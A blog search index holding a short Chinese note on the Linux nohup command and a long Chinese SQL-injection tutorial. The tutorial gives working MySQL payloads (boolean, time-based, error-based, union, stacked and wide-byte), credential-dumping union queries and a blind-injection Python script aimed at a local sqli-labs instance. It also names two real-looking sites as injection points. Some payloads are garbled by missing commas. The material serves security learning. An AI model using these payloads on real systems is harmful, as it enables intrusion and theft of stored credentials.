<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Linux 的 nohup 命令的用法</title>
    <url>/2022/02/23/Linux%20%E7%9A%84%20nohup%20%E5%91%BD%E4%BB%A4%E7%9A%84%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用 nohup 命令。</p>
<span id="more"></span>

<h1 id="命令简介"><a href="#命令简介" class="headerlink" title="命令简介"></a>命令简介</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup Command [ Arg … ] [ &amp; ]</span><br></pre></td></tr></table></figure>

<p>该命令可以在你退出帐户&#x2F;关闭终端之后继续运行相应的进程。<code>nohup</code>就是不挂起的意思（<code>no hang up</code>）。</p>
<p><code>nohup</code> 运行由 <code>Command</code> 和相关的 <code>Arg</code> 参数指定的命令，忽略所有挂断（<code>SIGHUP</code>）信号。要运行后台中的 <code>nohup</code> 命令，添加 <code>&amp;</code> （ 表示 <code>and</code> 的符号）到命令的尾部。</p>
<p>如果使用 <code>nohup</code> 命令提交作业，那么在缺省情况下该作业的所有输出都被重定向到一个名为 nohup.out 的文件中，除非另外指定了输出文件。</p>
<h1 id="使用举例"><a href="#使用举例" class="headerlink" title="使用举例"></a>使用举例</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>在上面的例子中，运行命令 <code>java -jar adapter-minisite.jar</code> 输入参数 <code>/tomcat-1</code> 和 <code>/tomcat-2</code>，输出被重定向到 <code>logs.txt</code> 文件中。</p>
<h1 id="退出任务"><a href="#退出任务" class="headerlink" title="退出任务"></a>退出任务</h1><p>如果运行的任务在当前 <code>shell</code> 终端，可以通过 <code>jobs</code> 命令查询相关信息，并且杀掉进程。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看当前 shell 终端的后台运行任务进程信息</span><br><span class="line">$ jobs</span><br><span class="line">[1]+ Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"># 杀掉任务号</span><br><span class="line">$ kill %1</span><br><span class="line"></span><br><span class="line"># 或着找到 pid</span><br><span class="line">$ jobs -l</span><br><span class="line">[1]+ 11076 Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">$ kill 11076</span><br><span class="line"></span><br><span class="line"># 或着</span><br><span class="line">$ fg %n # 置为前端运行</span><br><span class="line"></span><br><span class="line">Ctrl + c # 退出</span><br></pre></td></tr></table></figure>

<p>如果非当前 <code>shell</code> 终端，可以通过 <code>ps auxf | grep adapter-minisite</code> 获取 <code>pid</code> 然后 <code>kill pid</code>。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入详解</title>
    <url>/2022/02/23/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="SQl注入原因（简单描述）"><a href="#SQl注入原因（简单描述）" class="headerlink" title="SQl注入原因（简单描述）"></a>SQl注入原因（简单描述）</h1><p>SQL注入是服务器端未严格检查客户端发送的数据，而导致服务端SQL语句被恶意修改并成功执行的行为称为SQL注入 </p>
<span id="more"></span>

<p><a href="https://imgchr.com/i/sj8AYR"><img data-src="https://s3.ax1x.com/2021/01/26/sj8AYR.png" alt="sj8AYR.png" border="0" /></a></p>
<p>出现原因</p>
<ol>
<li>代码对带入SQL语句的参数过滤不严格</li>
<li>未启用框架的安全配置，例如：PHP的magic_quotes_gpc</li>
<li>未使用框架的安全查询方法</li>
<li>测试接口未删除</li>
<li>未启用防火墙</li>
<li>未使用其他安全防护设备</li>
</ol>
<p><mark>任何和数据库进行交互的地方便有可能存在注入</mark></p>
<p>#注入点判断<br>判断是否存在注入点最常见的做法是利用单引号，即“  ”。因为当你在网页上进行查询操作的时候，在后台提交的语句实际上是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM database_name WHERE id=$id</span><br></pre></td></tr></table></figure>
<p>所以当你查询的时候键入单引号的时候，因为单引号不匹配，则会报错。然后可以测试是否存在SQL注入点。</p>
<ol>
<li><p>and语句<br>在参数处输入 1 and 1&#x3D;1、1 and 1&#x3D;2。当出现前者返回页数为1的页面，而后者没有返回数据的时候，可以认为是存在注入点。当然也可以使用or语句进行测试。</p>
</li>
<li><p>or语句<br>在参数处输入 6 or 1 &#x3D; 1，当前者6为不存在的数字时，即假 or 真，返回页面时，存在注入点。</p>
</li>
<li><p>加法<br>可以在参数处输入 1 + 1，若返回的是第2个页面，则存在注入点，同时需要注意的是“+”号需要进行url的转码，转码为%2b</p>
</li>
<li><p>减法<br>和加法类似，在参数处输入 4-2，若返回的是第二个页面，则存在注入点。</p>
</li>
</ol>
<h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><p>形如“<span class="exturl" data-url="aHR0cDovL3p6enovP0lEPTU1JUUyJTgwJTlEJUVGJUJDJThDJUU4JUJGJTk5JUU3JUIxJUJCJUU2JUIzJUE4JUU1JTg1JUE1JUU3JTlBJTg0JUU1JThGJTgyJUU2JTk1JUIwJUU2JTk4JUFGJUUyJTgwJTlDJUU2JTk1JUIwJUU1JUFEJTk3JUUyJTgwJTlEJUVGJUJDJThDJUU1JTlCJUEwJUU2JUFEJUE0JUU3JUE3JUIwJUU0JUI4JUJBJUUyJTgwJTlDJUU2JTk1JUIwJUU1JUFEJTk3JUU1JTlFJThCJUU2JUIzJUE4JUU1JTg1JUE1JUU3JTgyJUI5JUUyJTgwJTlEJUUzJTgwJTgyJUU2JUFEJUE0JUU3JUIxJUJCJUU2JUIzJUE4JUU1JTg1JUE1JUU3JTgyJUI5JUU2JThGJTkwJUU0JUJBJUE0JUU3JTlBJTg0U1FMJUU4JUFGJUFEJUU1JThGJUE1JUVGJUJDJThDJUU1JTg1JUI2JUU1JThFJTlGJUU1JUJEJUEyJUU1JUE0JUE3JUU4JTg3JUI0JUU0JUI4JUJBJUVGJUJDJTlBU2VsZWN0">http://zzzz?ID=55”，这类注入的参数是“数字”，因此称为“数字型注入点”。此类注入点提交的SQL语句，其原形大致为：Select<i class="fa fa-external-link-alt"></i></span> * from 表名 where 字段&#x3D;55当我们提交注入参数为“<span class="exturl" data-url="aHR0cDovL3p6enovP0lEPTU1">http://zzzz?ID=55<i class="fa fa-external-link-alt"></i></span> And[查询条件]”时，向数据库提交的完整 SQL 语句为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select * from 表名 where 字段=55 And [查询条件]</span><br></pre></td></tr></table></figure>

<h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h1><p>形如“http:&#x2F;&#x2F;****?Class&#x3D;日期”这类注入的参数是“字符”，因此称为“字符型”注入点。此类注入点提交的 SQL 语句，其原形大致为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where 字段=’日期’</span><br></pre></td></tr></table></figure>
<p>当我们提交注入参数为“http:&#x2F;&#x2F;****Class&#x3D;日期 And[查询条件]时，向数据库提交的完整 SQL 语句为”：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where 字段=’日期’ and [查询条件]</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cDovL3d3dy54eWNqLmdvdi5jbi9ja3Mva3cuYXNwP2FjdGlvbj1naA==">http://www.xycj.gov.cn/cks/kw.asp?action=gh<i class="fa fa-external-link-alt"></i></span> 注入点 字母<br><span class="exturl" data-url="aHR0cDovL3d3dy56Z2Nmb3J1bS5vcmcvZm9ydW0uYXNwP3RpdGxlPSVFNCVCQyU5QSVFOCVBRSVBRSVFOCVBRSVBRSVFNyVBOCU4Qg==">http://www.zgcforum.org/forum.asp?title=会议议程<i class="fa fa-external-link-alt"></i></span> 注入点中文</p>
<h1 id="搜索型注入点"><a href="#搜索型注入点" class="headerlink" title="搜索型注入点"></a>搜索型注入点</h1><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中<br>有“keyword&#x3D;关键字”，有的不显示的链接地址，而是直接通过搜索框表单提交。此类注入点提交的SQL 语句，其原形大致为：select * from 表名 where 字段 like ‘%关键字%’。当我们提交注入参数为“keyword&#x3D;’and[查询条件] and ‘%’&#x3D;’则向数据库提交的完整SQL语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">selct * from 表名 where 字段 like ‘%’ and [查询条件] and ‘%’=’%’</span><br></pre></td></tr></table></figure>

<h1 id="POST-注入"><a href="#POST-注入" class="headerlink" title="POST 注入"></a>POST 注入</h1><p>post注入是通过对输入框进行传参，可以被带入数据库进行的查询</p>
<p>注入的两个条件：1.用户可以控制传参，2.用户输入的语句被带入数据库进行查询</p>
<h2 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h2><p>对输入框填入一些闭合的符号，看页面是否异常<br>例如： ’        “          )          “)</p>
<h1 id="Cookie-注入"><a href="#Cookie-注入" class="headerlink" title="Cookie 注入"></a>Cookie 注入</h1><p>cookie注入其原理也和平时的注入一样，只不过说我们是将提交的参数以cookie方式提交了，而一般的注入我们是使用get或者post方式提交，get方式提交就是直接在网址后面加上需要注入的语句，post则是通过表单方式，get和post的不同之处就在于一个我们可以通过IE地址栏处看到我们提交的参数，而另外一个却不能。</p>
<p>成有两个必须条件，</p>
<ol>
<li><p>程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。</p>
</li>
<li><p>在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。</p>
</li>
</ol>
<h2 id="注入点判断-1"><a href="#注入点判断-1" class="headerlink" title="注入点判断"></a>注入点判断</h2><p>URL： <span class="exturl" data-url="aHR0cDovL3d3dy8/aWQ9OTk=">http://www/?id=99<i class="fa fa-external-link-alt"></i></span><br>等页面完全打开后换成<br>URL： javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“99”));<br>弹出消息框<br>将?id&#x3D;99去掉再次访问，如果和之前一样说明程序在使用request对象获取数据的时候并未指明具体使用什么方法来获取，而是直接使用request(“xx”)的方式。现在cookie形成的一个重要因素已经明确了，接下来我们测试下能否提交特殊字符，看程序是否对数据进行过滤。</p>
<p>正常<br>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“99 and 1&#x3D;1”));</p>
<p>报错<br>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“99 and 1&#x3D;2”));<br>然后就是常规操作了</p>
<h1 id="HTTP头部注入"><a href="#HTTP头部注入" class="headerlink" title="HTTP头部注入"></a>HTTP头部注入</h1><p>注入点在 HTTP 请求头部的某个字段中，一样是因为数据库没有对输入的请求头做过滤造成的<br>常出现在User-Agent 、 X-Forwarded-For等等</p>
<blockquote>
<p>根据提交方式分类后，可以发现SQL注入最长发生的位置在链接地址、数据参数、cookie信息以及HTTP请求头等位置。</p>
</blockquote>
<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>即可以根据返回页面判断条件真假的注入</p>
<p>盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br><span class="line">if(expr1expr2expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br></pre></td></tr></table></figure>

<p>当然如果上面的函数被禁用，也有相应的函数替换。可百度</p>
<p>布尔型：页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p>
<p><code>http://127.0.0.1/Less-8/?id=1and (length(database()))&gt;10 --+</code></p>
<p>当前数据库database（）的长度大于10，返回true页面，否则FALSE页面</p>
<p>报错型：构造payload让信息通过错误提示回显出来，一种类型（其它的暂时不怎么了解）是先报字段数，再利用后台数据库报错机制回显（跟一般的报错区别是，一般的报错注入是爆出字段数后，在此基础通过正确的查询语句，使结果回显到页面；后者是在爆出字段数的基础上使用能触发SQL报错机制的注入语句）</p>
<p>列如典型payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select 1count(*)concat(0x3a0x3a(select user())0x3a0x3afloor(rand(0)*2))a from information_schema.columns group by a;</span><br></pre></td></tr></table></figure>
<p>count(*)计数   concat()连接字符   floor()重复数据，返回01两个值  group by 进行分组 rand(0)避免数据重复造成的错误</p>
<p>时间型：通过页面沉睡时间判断<br>通过 sleep（）函数测试，通过if（）和sleep（）联合逐个猜解数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-9/?id=1 and (if(ascii(substr(database()11))&gt;100sleep(10)sleep(4))  --+ </span><br></pre></td></tr></table></figure>
<p>如果当前查询的当前数据库ascii(substr(database())11)的第一个字符的ASCII码大于100，ture 沉睡10秒，FALSE 沉睡4秒</p>
<p>sqli-labs第八关脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">def database_len():</span><br><span class="line">for i in range(110):</span><br><span class="line">url = http://127.0.0.1/sqli-labs-master/Less-8/index.php</span><br><span class="line">payload = ?id=1 and length(database())&gt;%s %i</span><br><span class="line"># print(url+payload+%23)</span><br><span class="line">r = requests.get(url+payload+%23)</span><br><span class="line">if You are in in r.text:</span><br><span class="line">print(i)</span><br><span class="line"> </span><br><span class="line">else:</span><br><span class="line">#print(false)</span><br><span class="line">print(database_length:i)</span><br><span class="line">break</span><br><span class="line">database_len()</span><br><span class="line"> </span><br><span class="line">def database_name():</span><br><span class="line">name = </span><br><span class="line">for j in range(19):</span><br><span class="line">for i in sqcwertyuioplkjhgfdazxvbnm:</span><br><span class="line">url = &quot;http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1 and substr(database()%d1)=%s&quot; %(ji)</span><br><span class="line"># print(url+%23)</span><br><span class="line">r = requests.get(url+%23)</span><br><span class="line">if You are in in r.text:</span><br><span class="line">name = name+i</span><br><span class="line"></span><br><span class="line">print(name)</span><br><span class="line"></span><br><span class="line">break</span><br><span class="line">print(database_name:name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database_name()</span><br></pre></td></tr></table></figure>

<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行(即页面返回时间是否增加)来判断。</p>
<p>用sqli-labs第九关讲解了<br>测试注入点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-9/?id=1 and if(1=1sleep(6)1)%23liy</span><br></pre></td></tr></table></figure>

<p>利用if(条件01)函数当条件为真返回0假则返回1</p>
<p>在这里是‘ and 1&#x3D;1 为真延时6秒假则直接返回注入点和注入语句基本确定可使用。</p>
<p>也可以用这个，当延迟1000毫秒比较接近的时候也是存在时间盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1^(select-sleep(1))^1</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = if(ascii(substr(database()11))&gt;95sleep(6)1)%23</span><br></pre></td></tr></table></figure>

<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</p>
<p>报错注入的十种方法</p>
<p>报错， –+正常可能是报错注入</p>
<h2 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h2><p>floor函数的作用是返回小于等于该值的最大整数也可以理解为向下取整，只保留整数部分<br>floor()报错注入准确地说应该是floorcountgroup by冲突报错</p>
<p>是当这三个函数在特定情况一起使用产生的错误。</p>
<p>首先看经典的floor注入语句:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and select 1 from (select count(*)concat(database()floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
<p>第一眼看起来有些懵逼，我们来从最基本的入手，最后在分析这个语句</p>
<p>首先是floor()报错产生的条件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) floor(rand(0)*2)x from security.users group by x(自定义数据库的一张表)</span><br></pre></td></tr></table></figure>
<p>这里解释一下x是什么意思，可能有些同学不太熟悉sql语句，floor(rand(0)*2)x的x是为floor(rand(0)*2)添加了一个别名，就是x就等于floor(rand(0)*2)，这样做的目的是<br>让group by 和 floor(rand(0)*2)相遇</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*)concat(user()floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>

<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>extractvalue() :对XML文档进行查询的函数</p>
<p>其实就是相当于我们熟悉的HTML文件中用 <div><p><a>标签查找元素一样</p>
<p>语法：extractvalue(目标xml文档，xml路径)</p>
<p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
<p>正常查询 第二个参数的位置格式 为 &#x2F;xxx&#x2F;xx&#x2F;xx&#x2F;xx 即使查询不到也不会报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1concat(0x7e(select user())0x7e)));</span><br></pre></td></tr></table></figure>

<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><p>updatexml()函数与extractvalue()类似，是更新xml文档的函数。</p>
<p>语法updatexml(目标xml文档，xml路径，更新的内容)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username from security.user where id=1 and (updatexml(‘anything’’/xx/xx’’anything’))</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and (updatexml(1concat(0x7e(select user())0x7e)1));</span><br></pre></td></tr></table></figure>

<h2 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h2><ol>
<li>函数解释<br>GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。对GeometryCollection的元素无任何限制，但下面介绍的GeometryCollection的子类会限制其成员。这类限制可能基于：</li>
</ol>
<p>元素类型（例如，MultiPoint可能仅包含Point元素）。</p>
<p>维数</p>
<p>对元素间空间交迭程度的限制</p>
<p>官方文档中举例的用法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GEOMETRYCOLLECTION(POINT(10 10) POINT(30 30) LINESTRING(15 15 20 20))</span><br></pre></td></tr></table></figure>
<p>POINT(xy) 函数这是坐标函数，相当于XY坐标图上的一点。</p>
<p>LINESTRING(x yx y)函数这个函数用来描述直线两点连成的直线。</p>
<ol start="2">
<li><p>报错原理<br>由于MYSQL无法用这样字符串画出图形所以报错了</p>
</li>
<li><p>约束条件<br><code>5.5&lt;mysql版本&lt;5.6</code></p>
</li>
<li><p>注入代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and geometrycollection((select * from(select * from (操作代码)a)b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
<h2 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
<h2 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a>multipolygon()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>

<h2 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
<h2 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h2><p>exp是以e为底的指数函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(1);</span><br><span class="line">+-------------------+</span><br><span class="line">| exp(1)            |</span><br><span class="line">+-------------------+</span><br><span class="line">| 2.718281828459045 |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in exp(710)</span><br></pre></td></tr></table></figure>
<p>将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select ~(select version());</span><br><span class="line">+----------------------+</span><br><span class="line">| ~(select version())  |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551610 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>我们通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(~(select * from(select database())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in exp(~((select `x`.`database()` from (select database() AS `database()`) `x`)))</span><br></pre></td></tr></table></figure>

<p>在脚本语言中，就会将错误中的一些表达式转化成相应的字符串，即像这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DOUBLE value is out of range in exp(~((select error_based_hpf from dual)))</span><br></pre></td></tr></table></figure>
<p>利用例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>

<h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><p>可以使用union的情况下的注入</p>
<p>判断字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order by 1 --+</span><br></pre></td></tr></table></figure>
<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的列数，因此我们要对字段数进行判断</p>
<p>判断回显点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select 123 limit 11 --+</span><br><span class="line">id=-1 union select 123 --+</span><br><span class="line">id=-1 union select 123%20 --+</span><br></pre></td></tr></table></figure>

<p>爆库名<br>可能判断的时候特殊情况还得留个心眼，但是下面就没啥好说的了，基本都是常规操作了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1database()3 --+</span><br></pre></td></tr></table></figure>

<p>爆表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1group_concat(table_name)3 from information_schema.tables where table_schema=security --+</span><br></pre></td></tr></table></figure>

<p>爆字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1group_concat(column_name)3 from information_schema.columns where table_schema=security and table_name=users --+</span><br></pre></td></tr></table></figure>

<p>查数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1group_concat(username0x5cpassword)3 from security.users --+</span><br></pre></td></tr></table></figure>

<h1 id="叠堆注入"><a href="#叠堆注入" class="headerlink" title="叠堆注入"></a>叠堆注入</h1><p>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users;show databases; </span><br></pre></td></tr></table></figure>
<p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够<br>虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>利用gbk是多字节的编码，两个字节代表一个汉字</p>
<ol>
<li>宽字节注入原理：<br>GBK 占用两字节</li>
</ol>
<p>ASCII占用一字节</p>
<p>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。</p>
<p>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ &#x3D;%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就好注入了。</p>
<p>当提交</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and 1=1%23</span><br></pre></td></tr></table></figure>
<p>时，MySQL的运行的SQL语句为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where  id =1\ and 1=1#</span><br></pre></td></tr></table></figure>
<p>很明显这是没有注入成功的，而当我们提交</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1%df and 1=1%23</span><br></pre></td></tr></table></figure>
<p>MySQL的运行的SQL语句为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id =1運 and 1=1#</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注入点判断<br>吧?id&#x3D;1 –&gt; ?id&#x3D;%df%27看回显是否有汉字</li>
</ol>
<p>然后都是常规操作了</p>
<h1 id="group-concat的使用"><a href="#group-concat的使用" class="headerlink" title="group_concat的使用"></a>group_concat的使用</h1><p><font color="red">mysql版本&gt;5.0切使用了information_schema数据库</font><br>爆所有数据名 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(SCHEMA_NAME) from (information_schema.schemata )</span><br></pre></td></tr></table></figure>

<p>得到当前库的所有表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name)from(information_schema.tables)where table_schema=database()</span><br></pre></td></tr></table></figure>

<p>得到表中的字段名 将敏感的表进行16进制编码adminuser&#x3D;0x61646D696E75736572</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(column_name) from (information_schema.columns) where table_name=0x61646D696E75736572</span><br></pre></td></tr></table></figure>

<p>得到字段具体的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(username0x3apassword) from (adminuser)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1group_concat(flag) from sqli.flag</span><br></pre></td></tr></table></figure>

<p>version() –&gt;查看版本<br>@@datadir –&gt;读数据库路径<br>user()    –&gt;当前账户<br>database()–&gt;当前数据库<br>into outfile–&gt;一句话用的</p>
<p>注释</p>
